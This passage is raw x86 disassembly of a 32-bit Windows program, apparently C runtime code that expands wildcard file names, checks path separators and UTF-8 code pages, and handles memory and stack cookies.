  407c08:	e8 fa 05 00 00       	call   0x408207
  407c0d:	85 c0                	test   %eax,%eax
  407c0f:	0f 85 81 00 00 00    	jne    0x407c96
  407c15:	8b 46 08             	mov    0x8(%esi),%eax
  407c18:	88 18                	mov    %bl,(%eax)
  407c1a:	eb cf                	jmp    0x407beb
  407c1c:	53                   	push   %ebx
  407c1d:	53                   	push   %ebx
  407c1e:	53                   	push   %ebx
  407c1f:	53                   	push   %ebx
  407c20:	6a ff                	push   $0xffffffff
  407c22:	56                   	push   %esi
  407c23:	53                   	push   %ebx
  407c24:	ff 75 14             	push   0x14(%ebp)
  407c27:	e8 95 11 00 00       	call   0x408dc1
  407c2c:	83 c4 20             	add    $0x20,%esp
  407c2f:	85 c0                	test   %eax,%eax
  407c31:	75 16                	jne    0x407c49
  407c33:	ff 15 70 f0 40 00    	call   *0x40f070
  407c39:	50                   	push   %eax
  407c3a:	e8 46 f8 ff ff       	call   0x407485
  407c3f:	59                   	pop    %ecx
  407c40:	e8 76 f8 ff ff       	call   0x4074bb
  407c45:	8b 00                	mov    (%eax),%eax
  407c47:	eb 4d                	jmp    0x407c96
  407c49:	57                   	push   %edi
  407c4a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407c4d:	3b 47 0c             	cmp    0xc(%edi),%eax
  407c50:	76 0c                	jbe    0x407c5e
  407c52:	50                   	push   %eax
  407c53:	8b cf                	mov    %edi,%ecx
  407c55:	e8 ad 05 00 00       	call   0x408207
  407c5a:	85 c0                	test   %eax,%eax
  407c5c:	75 37                	jne    0x407c95
  407c5e:	53                   	push   %ebx
  407c5f:	53                   	push   %ebx
  407c60:	ff 77 0c             	push   0xc(%edi)
  407c63:	ff 77 08             	push   0x8(%edi)
  407c66:	6a ff                	push   $0xffffffff
  407c68:	56                   	push   %esi
  407c69:	53                   	push   %ebx
  407c6a:	ff 75 14             	push   0x14(%ebp)
  407c6d:	e8 4f 11 00 00       	call   0x408dc1
  407c72:	83 c4 20             	add    $0x20,%esp
  407c75:	85 c0                	test   %eax,%eax
  407c77:	75 16                	jne    0x407c8f
  407c79:	ff 15 70 f0 40 00    	call   *0x40f070
  407c7f:	50                   	push   %eax
  407c80:	e8 00 f8 ff ff       	call   0x407485
  407c85:	59                   	pop    %ecx
  407c86:	e8 30 f8 ff ff       	call   0x4074bb
  407c8b:	8b 00                	mov    (%eax),%eax
  407c8d:	eb 06                	jmp    0x407c95
  407c8f:	48                   	dec    %eax
  407c90:	89 47 10             	mov    %eax,0x10(%edi)
  407c93:	33 c0                	xor    %eax,%eax
  407c95:	5f                   	pop    %edi
  407c96:	5e                   	pop    %esi
  407c97:	5b                   	pop    %ebx
  407c98:	5d                   	pop    %ebp
  407c99:	c3                   	ret
  407c9a:	8b ff                	mov    %edi,%edi
  407c9c:	55                   	push   %ebp
  407c9d:	8b ec                	mov    %esp,%ebp
  407c9f:	51                   	push   %ecx
  407ca0:	ff 75 10             	push   0x10(%ebp)
  407ca3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407ca6:	50                   	push   %eax
  407ca7:	ff 75 0c             	push   0xc(%ebp)
  407caa:	ff 75 08             	push   0x8(%ebp)
  407cad:	e8 67 fe ff ff       	call   0x407b19
  407cb2:	83 c4 10             	add    $0x10,%esp
  407cb5:	c9                   	leave
  407cb6:	c3                   	ret
  407cb7:	8b ff                	mov    %edi,%edi
  407cb9:	55                   	push   %ebp
  407cba:	8b ec                	mov    %esp,%ebp
  407cbc:	8b 45 0c             	mov    0xc(%ebp),%eax
  407cbf:	83 ec 28             	sub    $0x28,%esp
  407cc2:	56                   	push   %esi
  407cc3:	85 c0                	test   %eax,%eax
  407cc5:	75 14                	jne    0x407cdb
  407cc7:	e8 ef f7 ff ff       	call   0x4074bb
  407ccc:	6a 16                	push   $0x16
  407cce:	5e                   	pop    %esi
  407ccf:	89 30                	mov    %esi,(%eax)
  407cd1:	e8 28 f7 ff ff       	call   0x4073fe
  407cd6:	e9 bb 01 00 00       	jmp    0x407e96
  407cdb:	8b 75 08             	mov    0x8(%ebp),%esi
  407cde:	53                   	push   %ebx
  407cdf:	33 db                	xor    %ebx,%ebx
  407ce1:	57                   	push   %edi
  407ce2:	89 18                	mov    %ebx,(%eax)
  407ce4:	8b fb                	mov    %ebx,%edi
  407ce6:	8b 06                	mov    (%esi),%eax
  407ce8:	8b cb                	mov    %ebx,%ecx
  407cea:	89 7d d8             	mov    %edi,-0x28(%ebp)
  407ced:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  407cf0:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  407cf3:	85 c0                	test   %eax,%eax
  407cf5:	74 61                	je     0x407d58
  407cf7:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  407cfa:	66 c7 45 fc 2a 3f    	movw   $0x3f2a,-0x4(%ebp)
  407d00:	51                   	push   %ecx
  407d01:	50                   	push   %eax
  407d02:	88 5d fe             	mov    %bl,-0x2(%ebp)
  407d05:	e8 26 32 00 00       	call   0x40af30
  407d0a:	59                   	pop    %ecx
  407d0b:	59                   	pop    %ecx
  407d0c:	8b 0e                	mov    (%esi),%ecx
  407d0e:	85 c0                	test   %eax,%eax
  407d10:	75 16                	jne    0x407d28
  407d12:	8d 45 d8             	lea    -0x28(%ebp),%eax
  407d15:	50                   	push   %eax
  407d16:	53                   	push   %ebx
  407d17:	53                   	push   %ebx
  407d18:	51                   	push   %ecx
  407d19:	e8 88 01 00 00       	call   0x407ea6
  407d1e:	8b f0                	mov    %eax,%esi
  407d20:	83 c4 10             	add    $0x10,%esp
  407d23:	89 75 f8             	mov    %esi,-0x8(%ebp)
  407d26:	eb 13                	jmp    0x407d3b
  407d28:	8d 55 d8             	lea    -0x28(%ebp),%edx
  407d2b:	52                   	push   %edx
  407d2c:	50                   	push   %eax
  407d2d:	51                   	push   %ecx
  407d2e:	e8 24 02 00 00       	call   0x407f57
  407d33:	83 c4 0c             	add    $0xc,%esp
  407d36:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407d39:	8b f0                	mov    %eax,%esi
  407d3b:	85 f6                	test   %esi,%esi
  407d3d:	0f 85 88 00 00 00    	jne    0x407dcb
  407d43:	8b 75 08             	mov    0x8(%ebp),%esi
  407d46:	83 c6 04             	add    $0x4,%esi
  407d49:	89 75 08             	mov    %esi,0x8(%ebp)
  407d4c:	8b 06                	mov    (%esi),%eax
  407d4e:	85 c0                	test   %eax,%eax
  407d50:	75 a5                	jne    0x407cf7
  407d52:	8b 7d d8             	mov    -0x28(%ebp),%edi
  407d55:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407d58:	8b c1                	mov    %ecx,%eax
  407d5a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407d5d:	2b c7                	sub    %edi,%eax
  407d5f:	8b f7                	mov    %edi,%esi
  407d61:	8b d0                	mov    %eax,%edx
  407d63:	89 75 f8             	mov    %esi,-0x8(%ebp)
  407d66:	c1 fa 02             	sar    $0x2,%edx
  407d69:	83 c0 03             	add    $0x3,%eax
  407d6c:	42                   	inc    %edx
  407d6d:	c1 e8 02             	shr    $0x2,%eax
  407d70:	3b ce                	cmp    %esi,%ecx
  407d72:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407d75:	1b f6                	sbb    %esi,%esi
  407d77:	f7 d6                	not    %esi
  407d79:	23 f0                	and    %eax,%esi
  407d7b:	74 2f                	je     0x407dac
  407d7d:	8b c7                	mov    %edi,%eax
  407d7f:	8b d3                	mov    %ebx,%edx
  407d81:	8b 08                	mov    (%eax),%ecx
  407d83:	8d 41 01             	lea    0x1(%ecx),%eax
  407d86:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407d89:	8a 01                	mov    (%ecx),%al
  407d8b:	41                   	inc    %ecx
  407d8c:	84 c0                	test   %al,%al
  407d8e:	75 f9                	jne    0x407d89
  407d90:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  407d93:	43                   	inc    %ebx
  407d94:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407d97:	03 d9                	add    %ecx,%ebx
  407d99:	83 c0 04             	add    $0x4,%eax
  407d9c:	42                   	inc    %edx
  407d9d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407da0:	3b d6                	cmp    %esi,%edx
  407da2:	75 dd                	jne    0x407d81
  407da4:	8b 55 f4             	mov    -0xc(%ebp),%edx
  407da7:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407daa:	33 db                	xor    %ebx,%ebx
  407dac:	6a 01                	push   $0x1
  407dae:	ff 75 fc             	push   -0x4(%ebp)
  407db1:	52                   	push   %edx
  407db2:	e8 c2 e0 ff ff       	call   0x405e79
  407db7:	8b f0                	mov    %eax,%esi
  407db9:	83 c4 0c             	add    $0xc,%esp
  407dbc:	85 f6                	test   %esi,%esi
  407dbe:	75 13                	jne    0x407dd3
  407dc0:	83 ce ff             	or     $0xffffffff,%esi
  407dc3:	89 75 f8             	mov    %esi,-0x8(%ebp)
  407dc6:	e9 85 00 00 00       	jmp    0x407e50
  407dcb:	8b 7d d8             	mov    -0x28(%ebp),%edi
  407dce:	e9 84 00 00 00       	jmp    0x407e57
  407dd3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407dd6:	89 7d f8             	mov    %edi,-0x8(%ebp)
  407dd9:	8d 04 86             	lea    (%esi,%eax,4),%eax
  407ddc:	8b c8                	mov    %eax,%ecx
  407dde:	89 45 e8             	mov    %eax,-0x18(%ebp)
  407de1:	8b c7                	mov    %edi,%eax
  407de3:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407de6:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407de9:	74 5b                	je     0x407e46
  407deb:	8b d6                	mov    %esi,%edx
  407ded:	2b d7                	sub    %edi,%edx
  407def:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407df2:	8b 00                	mov    (%eax),%eax
  407df4:	8b d0                	mov    %eax,%edx
  407df6:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407df9:	8d 42 01             	lea    0x1(%edx),%eax
  407dfc:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407dff:	8a 02                	mov    (%edx),%al
  407e01:	42                   	inc    %edx
  407e02:	84 c0                	test   %al,%al
  407e04:	75 f9                	jne    0x407dff
  407e06:	2b 55 f0             	sub    -0x10(%ebp),%edx
  407e09:	8d 42 01             	lea    0x1(%edx),%eax
  407e0c:	50                   	push   %eax
  407e0d:	ff 75 ec             	push   -0x14(%ebp)
  407e10:	89 45 f0             	mov    %eax,-0x10(%ebp)
  407e13:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407e16:	2b c1                	sub    %ecx,%eax
  407e18:	03 45 fc             	add    -0x4(%ebp),%eax
  407e1b:	50                   	push   %eax
  407e1c:	51                   	push   %ecx
  407e1d:	e8 ff 30 00 00       	call   0x40af21
  407e22:	83 c4 10             	add    $0x10,%esp
  407e25:	85 c0                	test   %eax,%eax
  407e27:	75 72                	jne    0x407e9b
  407e29:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407e2c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  407e2f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407e32:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
  407e35:	83 c0 04             	add    $0x4,%eax
  407e38:	03 4d f0             	add    -0x10(%ebp),%ecx
  407e3b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407e3e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407e41:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407e44:	75 ac                	jne    0x407df2
  407e46:	8b 45 0c             	mov    0xc(%ebp),%eax
  407e49:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407e4c:	89 30                	mov    %esi,(%eax)
  407e4e:	8b f3                	mov    %ebx,%esi
  407e50:	53                   	push   %ebx
  407e51:	e8 71 fc ff ff       	call   0x407ac7
  407e56:	59                   	pop    %ecx
  407e57:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407e5a:	8b d7                	mov    %edi,%edx
  407e5c:	2b c2                	sub    %edx,%eax
  407e5e:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407e61:	83 c0 03             	add    $0x3,%eax
  407e64:	c1 e8 02             	shr    $0x2,%eax
  407e67:	39 55 dc             	cmp    %edx,-0x24(%ebp)
  407e6a:	1b c9                	sbb    %ecx,%ecx
  407e6c:	f7 d1                	not    %ecx
  407e6e:	23 c8                	and    %eax,%ecx
  407e70:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  407e73:	74 18                	je     0x407e8d
  407e75:	8b f1                	mov    %ecx,%esi
  407e77:	ff 37                	push   (%edi)
  407e79:	e8 49 fc ff ff       	call   0x407ac7
  407e7e:	43                   	inc    %ebx
  407e7f:	8d 7f 04             	lea    0x4(%edi),%edi
  407e82:	59                   	pop    %ecx
  407e83:	3b de                	cmp    %esi,%ebx
  407e85:	75 f0                	jne    0x407e77
  407e87:	8b 7d d8             	mov    -0x28(%ebp),%edi
  407e8a:	8b 75 f8             	mov    -0x8(%ebp),%esi
  407e8d:	57                   	push   %edi
  407e8e:	e8 34 fc ff ff       	call   0x407ac7
  407e93:	59                   	pop    %ecx
  407e94:	5f                   	pop    %edi
  407e95:	5b                   	pop    %ebx
  407e96:	8b c6                	mov    %esi,%eax
  407e98:	5e                   	pop    %esi
  407e99:	c9                   	leave
  407e9a:	c3                   	ret
  407e9b:	53                   	push   %ebx
  407e9c:	53                   	push   %ebx
  407e9d:	53                   	push   %ebx
  407e9e:	53                   	push   %ebx
  407e9f:	53                   	push   %ebx
  407ea0:	e8 69 f5 ff ff       	call   0x40740e
  407ea5:	cc                   	int3
  407ea6:	8b ff                	mov    %edi,%edi
  407ea8:	55                   	push   %ebp
  407ea9:	8b ec                	mov    %esp,%ebp
  407eab:	51                   	push   %ecx
  407eac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407eaf:	8d 51 01             	lea    0x1(%ecx),%edx
  407eb2:	8a 01                	mov    (%ecx),%al
  407eb4:	41                   	inc    %ecx
  407eb5:	84 c0                	test   %al,%al
  407eb7:	75 f9                	jne    0x407eb2
  407eb9:	57                   	push   %edi
  407eba:	8b 7d 10             	mov    0x10(%ebp),%edi
  407ebd:	2b ca                	sub    %edx,%ecx
  407ebf:	8b c7                	mov    %edi,%eax
  407ec1:	41                   	inc    %ecx
  407ec2:	f7 d0                	not    %eax
  407ec4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407ec7:	3b c8                	cmp    %eax,%ecx
  407ec9:	76 06                	jbe    0x407ed1
  407ecb:	6a 0c                	push   $0xc
  407ecd:	58                   	pop    %eax
  407ece:	5f                   	pop    %edi
  407ecf:	c9                   	leave
  407ed0:	c3                   	ret
  407ed1:	53                   	push   %ebx
  407ed2:	56                   	push   %esi
  407ed3:	8d 5f 01             	lea    0x1(%edi),%ebx
  407ed6:	03 d9                	add    %ecx,%ebx
  407ed8:	6a 01                	push   $0x1
  407eda:	53                   	push   %ebx
  407edb:	e8 8a fb ff ff       	call   0x407a6a
  407ee0:	8b f0                	mov    %eax,%esi
  407ee2:	59                   	pop    %ecx
  407ee3:	59                   	pop    %ecx
  407ee4:	85 ff                	test   %edi,%edi
  407ee6:	74 12                	je     0x407efa
  407ee8:	57                   	push   %edi
  407ee9:	ff 75 0c             	push   0xc(%ebp)
  407eec:	53                   	push   %ebx
  407eed:	56                   	push   %esi
  407eee:	e8 2e 30 00 00       	call   0x40af21
  407ef3:	83 c4 10             	add    $0x10,%esp
  407ef6:	85 c0                	test   %eax,%eax
  407ef8:	75 50                	jne    0x407f4a
  407efa:	ff 75 fc             	push   -0x4(%ebp)
  407efd:	2b df                	sub    %edi,%ebx
  407eff:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  407f02:	ff 75 08             	push   0x8(%ebp)
  407f05:	53                   	push   %ebx
  407f06:	50                   	push   %eax
  407f07:	e8 15 30 00 00       	call   0x40af21
  407f0c:	83 c4 10             	add    $0x10,%esp
  407f0f:	85 c0                	test   %eax,%eax
  407f11:	75 37                	jne    0x407f4a
  407f13:	8b 5d 14             	mov    0x14(%ebp),%ebx
  407f16:	8b cb                	mov    %ebx,%ecx
  407f18:	e8 84 03 00 00       	call   0x4082a1
  407f1d:	33 ff                	xor    %edi,%edi
  407f1f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407f22:	85 c0                	test   %eax,%eax
  407f24:	74 0c                	je     0x407f32
  407f26:	56                   	push   %esi
  407f27:	e8 9b fb ff ff       	call   0x407ac7
  407f2c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  407f2f:	59                   	pop    %ecx
  407f30:	eb 0b                	jmp    0x407f3d
  407f32:	8b 43 04             	mov    0x4(%ebx),%eax
  407f35:	89 30                	mov    %esi,(%eax)
  407f37:	8b f7                	mov    %edi,%esi
  407f39:	83 43 04 04          	addl   $0x4,0x4(%ebx)
  407f3d:	57                   	push   %edi
  407f3e:	e8 84 fb ff ff       	call   0x407ac7
  407f43:	59                   	pop    %ecx
  407f44:	8b c6                	mov    %esi,%eax
  407f46:	5e                   	pop    %esi
  407f47:	5b                   	pop    %ebx
  407f48:	eb 84                	jmp    0x407ece
  407f4a:	33 ff                	xor    %edi,%edi
  407f4c:	57                   	push   %edi
  407f4d:	57                   	push   %edi
  407f4e:	57                   	push   %edi
  407f4f:	57                   	push   %edi
  407f50:	57                   	push   %edi
  407f51:	e8 b8 f4 ff ff       	call   0x40740e
  407f56:	cc                   	int3
  407f57:	8b ff                	mov    %edi,%edi
  407f59:	55                   	push   %ebp
  407f5a:	8b ec                	mov    %esp,%ebp
  407f5c:	81 ec 98 02 00 00    	sub    $0x298,%esp
  407f62:	a1 04 60 41 00       	mov    0x416004,%eax
  407f67:	33 c5                	xor    %ebp,%eax
  407f69:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407f6c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407f6f:	8b 55 10             	mov    0x10(%ebp),%edx
  407f72:	53                   	push   %ebx
  407f73:	57                   	push   %edi
  407f74:	8b 7d 08             	mov    0x8(%ebp),%edi
  407f77:	89 95 a4 fd ff ff    	mov    %edx,-0x25c(%ebp)
  407f7d:	3b cf                	cmp    %edi,%ecx
  407f7f:	74 23                	je     0x407fa4
  407f81:	8a 01                	mov    (%ecx),%al
  407f83:	3c 2f                	cmp    $0x2f,%al
  407f85:	74 17                	je     0x407f9e
  407f87:	3c 5c                	cmp    $0x5c,%al
  407f89:	74 13                	je     0x407f9e
  407f8b:	3c 3a                	cmp    $0x3a,%al
  407f8d:	74 0f                	je     0x407f9e
  407f8f:	51                   	push   %ecx
  407f90:	57                   	push   %edi
  407f91:	e8 da 2f 00 00       	call   0x40af70
  407f96:	59                   	pop    %ecx
  407f97:	59                   	pop    %ecx
  407f98:	8b c8                	mov    %eax,%ecx
  407f9a:	3b cf                	cmp    %edi,%ecx
  407f9c:	75 e3                	jne    0x407f81
  407f9e:	8b 95 a4 fd ff ff    	mov    -0x25c(%ebp),%edx
  407fa4:	8a 01                	mov    (%ecx),%al
  407fa6:	88 85 ab fd ff ff    	mov    %al,-0x255(%ebp)
  407fac:	3c 3a                	cmp    $0x3a,%al
  407fae:	75 20                	jne    0x407fd0
  407fb0:	8d 47 01             	lea    0x1(%edi),%eax
  407fb3:	3b c8                	cmp    %eax,%ecx
  407fb5:	74 13                	je     0x407fca
  407fb7:	52                   	push   %edx
  407fb8:	33 db                	xor    %ebx,%ebx
  407fba:	53                   	push   %ebx
  407fbb:	53                   	push   %ebx
  407fbc:	57                   	push   %edi
  407fbd:	e8 e4 fe ff ff       	call   0x407ea6
  407fc2:	83 c4 10             	add    $0x10,%esp
  407fc5:	e9 d6 01 00 00       	jmp    0x4081a0
  407fca:	8a 85 ab fd ff ff    	mov    -0x255(%ebp),%al
  407fd0:	33 db                	xor    %ebx,%ebx
  407fd2:	3c 2f                	cmp    $0x2f,%al
  407fd4:	74 0a                	je     0x407fe0
  407fd6:	3c 5c                	cmp    $0x5c,%al
  407fd8:	74 06                	je     0x407fe0
  407fda:	3c 3a                	cmp    $0x3a,%al
  407fdc:	8a c3                	mov    %bl,%al
  407fde:	75 02                	jne    0x407fe2
  407fe0:	b0 01                	mov    $0x1,%al
  407fe2:	2b cf                	sub    %edi,%ecx
  407fe4:	0f b6 c0             	movzbl %al,%eax
  407fe7:	41                   	inc    %ecx
  407fe8:	89 9d 68 fd ff ff    	mov    %ebx,-0x298(%ebp)
  407fee:	f7 d8                	neg    %eax
  407ff0:	89 9d 6c fd ff ff    	mov    %ebx,-0x294(%ebp)
  407ff6:	56                   	push   %esi
  407ff7:	1b c0                	sbb    %eax,%eax
  407ff9:	89 9d 70 fd ff ff    	mov    %ebx,-0x290(%ebp)
  407fff:	23 c1                	and    %ecx,%eax
  408001:	89 9d 74 fd ff ff    	mov    %ebx,-0x28c(%ebp)
  408007:	89 85 88 fd ff ff    	mov    %eax,-0x278(%ebp)
  40800d:	89 9d 78 fd ff ff    	mov    %ebx,-0x288(%ebp)
  408013:	88 9d 7c fd ff ff    	mov    %bl,-0x284(%ebp)
  408019:	e8 90 01 00 00       	call   0x4081ae
  40801e:	50                   	push   %eax
  40801f:	8d 85 68 fd ff ff    	lea    -0x298(%ebp),%eax
  408025:	50                   	push   %eax
  408026:	57                   	push   %edi
  408027:	e8 6e fc ff ff       	call   0x407c9a
  40802c:	83 c4 0c             	add    $0xc,%esp
  40802f:	8d 8d ac fd ff ff    	lea    -0x254(%ebp),%ecx
  408035:	f7 d8                	neg    %eax
  408037:	1b c0                	sbb    %eax,%eax
  408039:	53                   	push   %ebx
  40803a:	53                   	push   %ebx
  40803b:	53                   	push   %ebx
  40803c:	51                   	push   %ecx
  40803d:	f7 d0                	not    %eax
  40803f:	23 85 70 fd ff ff    	and    -0x290(%ebp),%eax
  408045:	53                   	push   %ebx
  408046:	50                   	push   %eax
  408047:	ff 15 c0 f1 40 00    	call   *0x40f1c0
  40804d:	8b f0                	mov    %eax,%esi
  40804f:	83 fe ff             	cmp    $0xffffffff,%esi
  408052:	75 18                	jne    0x40806c
  408054:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
  40805a:	53                   	push   %ebx
  40805b:	53                   	push   %ebx
  40805c:	57                   	push   %edi
  40805d:	e8 44 fe ff ff       	call   0x407ea6
  408062:	83 c4 10             	add    $0x10,%esp
  408065:	8b d8                	mov    %eax,%ebx
  408067:	e9 1c 01 00 00       	jmp    0x408188
  40806c:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  408072:	8b 48 04             	mov    0x4(%eax),%ecx
  408075:	2b 08                	sub    (%eax),%ecx
  408077:	c1 f9 02             	sar    $0x2,%ecx
  40807a:	89 8d 84 fd ff ff    	mov    %ecx,-0x27c(%ebp)
  408080:	89 9d 8c fd ff ff    	mov    %ebx,-0x274(%ebp)
  408086:	89 9d 90 fd ff ff    	mov    %ebx,-0x270(%ebp)
  40808c:	89 9d 94 fd ff ff    	mov    %ebx,-0x26c(%ebp)
  408092:	89 9d 98 fd ff ff    	mov    %ebx,-0x268(%ebp)
  408098:	89 9d 9c fd ff ff    	mov    %ebx,-0x264(%ebp)
  40809e:	88 9d a0 fd ff ff    	mov    %bl,-0x260(%ebp)
  4080a4:	e8 05 01 00 00       	call   0x4081ae
  4080a9:	50                   	push   %eax
  4080aa:	8d 85 ab fd ff ff    	lea    -0x255(%ebp),%eax
  4080b0:	50                   	push   %eax
  4080b1:	8d 85 8c fd ff ff    	lea    -0x274(%ebp),%eax
  4080b7:	50                   	push   %eax
  4080b8:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  4080be:	50                   	push   %eax
  4080bf:	e8 07 fb ff ff       	call   0x407bcb
  4080c4:	83 c4 10             	add    $0x10,%esp
  4080c7:	f7 d8                	neg    %eax
  4080c9:	1b c0                	sbb    %eax,%eax
  4080cb:	f7 d0                	not    %eax
  4080cd:	23 85 94 fd ff ff    	and    -0x26c(%ebp),%eax
  4080d3:	80 38 2e             	cmpb   $0x2e,(%eax)
  4080d6:	75 11                	jne    0x4080e9
  4080d8:	8a 48 01             	mov    0x1(%eax),%cl
  4080db:	84 c9                	test   %cl,%cl
  4080dd:	74 2a                	je     0x408109
  4080df:	80 f9 2e             	cmp    $0x2e,%cl
  4080e2:	75 05                	jne    0x4080e9
  4080e4:	38 58 02             	cmp    %bl,0x2(%eax)
  4080e7:	74 20                	je     0x408109
  4080e9:	ff b5 a4 fd ff ff    	push   -0x25c(%ebp)
  4080ef:	ff b5 88 fd ff ff    	push   -0x278(%ebp)
  4080f5:	57                   	push   %edi
  4080f6:	50                   	push   %eax
  4080f7:	e8 aa fd ff ff       	call   0x407ea6
  4080fc:	83 c4 10             	add    $0x10,%esp
  4080ff:	89 85 80 fd ff ff    	mov    %eax,-0x280(%ebp)
  408105:	85 c0                	test   %eax,%eax
  408107:	75 5c                	jne    0x408165
  408109:	38 9d a0 fd ff ff    	cmp    %bl,-0x260(%ebp)
  40810f:	74 0c                	je     0x40811d
  408111:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
  408117:	e8 ab f9 ff ff       	call   0x407ac7
  40811c:	59                   	pop    %ecx
  40811d:	8d 85 ac fd ff ff    	lea    -0x254(%ebp),%eax
  408123:	50                   	push   %eax
  408124:	56                   	push   %esi
  408125:	ff 15 c4 f1 40 00    	call   *0x40f1c4
  40812b:	85 c0                	test   %eax,%eax
  40812d:	0f 85 4d ff ff ff    	jne    0x408080
  408133:	8b 85 a4 fd ff ff    	mov    -0x25c(%ebp),%eax
  408139:	8b 8d 84 fd ff ff    	mov    -0x27c(%ebp),%ecx
  40813f:	8b 10                	mov    (%eax),%edx
  408141:	8b 40 04             	mov    0x4(%eax),%eax
  408144:	2b c2                	sub    %edx,%eax
  408146:	c1 f8 02             	sar    $0x2,%eax
  408149:	3b c8                	cmp    %eax,%ecx
  40814b:	74 34                	je     0x408181
  40814d:	68 01 7b 40 00       	push   $0x407b01
  408152:	2b c1                	sub    %ecx,%eax
  408154:	6a 04                	push   $0x4
  408156:	50                   	push   %eax
  408157:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  40815a:	50                   	push   %eax
  40815b:	e8 20 28 00 00       	call   0x40a980
  408160:	83 c4 10             	add    $0x10,%esp
  408163:	eb 1c                	jmp    0x408181
  408165:	38 9d a0 fd ff ff    	cmp    %bl,-0x260(%ebp)
  40816b:	74 12                	je     0x40817f
  40816d:	ff b5 94 fd ff ff    	push   -0x26c(%ebp)
  408173:	e8 4f f9 ff ff       	call   0x407ac7
  408178:	8b 85 80 fd ff ff    	mov    -0x280(%ebp),%eax
  40817e:	59                   	pop    %ecx
  40817f:	8b d8                	mov    %eax,%ebx
  408181:	56                   	push   %esi
  408182:	ff 15 bc f1 40 00    	call   *0x40f1bc
  408188:	80 bd 7c fd ff ff 00 	cmpb   $0x0,-0x284(%ebp)
  40818f:	5e                   	pop    %esi
  408190:	74 0c                	je     0x40819e
  408192:	ff b5 70 fd ff ff    	push   -0x290(%ebp)
  408198:	e8 2a f9 ff ff       	call   0x407ac7
  40819d:	59                   	pop    %ecx
  40819e:	8b c3                	mov    %ebx,%eax
  4081a0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4081a3:	5f                   	pop    %edi
  4081a4:	33 cd                	xor    %ebp,%ecx
  4081a6:	5b                   	pop    %ebx
  4081a7:	e8 99 b5 ff ff       	call   0x403745
  4081ac:	c9                   	leave
  4081ad:	c3                   	ret
  4081ae:	8b ff                	mov    %edi,%edi
  4081b0:	55                   	push   %ebp
  4081b1:	8b ec                	mov    %esp,%ebp
  4081b3:	83 ec 10             	sub    $0x10,%esp
  4081b6:	6a 00                	push   $0x0
  4081b8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4081bb:	e8 a0 d6 ff ff       	call   0x405860
  4081c0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4081c3:	ba e9 fd 00 00       	mov    $0xfde9,%edx
  4081c8:	39 50 08             	cmp    %edx,0x8(%eax)
  4081cb:	74 0c                	je     0x4081d9
  4081cd:	e8 d4 f4 ff ff       	call   0x4076a6
  4081d2:	33 d2                	xor    %edx,%edx
  4081d4:	85 c0                	test   %eax,%eax
  4081d6:	75 01                	jne    0x4081d9
  4081d8:	42                   	inc    %edx
  4081d9:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  4081dd:	74 0a                	je     0x4081e9
  4081df:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4081e2:	83 a1 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%ecx)
  4081e9:	8b c2                	mov    %edx,%eax
  4081eb:	c9                   	leave
  4081ec:	c3                   	ret
  4081ed:	8b ff                	mov    %edi,%edi
  4081ef:	56                   	push   %esi
  4081f0:	8b f1                	mov    %ecx,%esi
  4081f2:	80 7e 14 00          	cmpb   $0x0,0x14(%esi)
  4081f6:	74 0d                	je     0x408205
  4081f8:	ff 76 08             	push   0x8(%esi)
  4081fb:	e8 c7 f8 ff ff       	call   0x407ac7
  408200:	59                   	pop    %ecx
  408201:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  408205:	5e                   	pop    %esi
  408206:	c3                   	ret
  408207:	8b ff                	mov    %edi,%edi
  408209:	55                   	push   %ebp
  40820a:	8b ec                	mov    %esp,%ebp
  40820c:	56                   	push   %esi
  40820d:	57                   	push   %edi
  40820e:	8b f1                	mov    %ecx,%esi
  408210:	e8 d8 ff ff ff       	call   0x4081ed
  408215:	8b 7d 08             	mov    0x8(%ebp),%edi
  408218:	8d 46 08             	lea    0x8(%esi),%eax
  40821b:	56                   	push   %esi
  40821c:	57                   	push   %edi
  40821d:	50                   	push   %eax
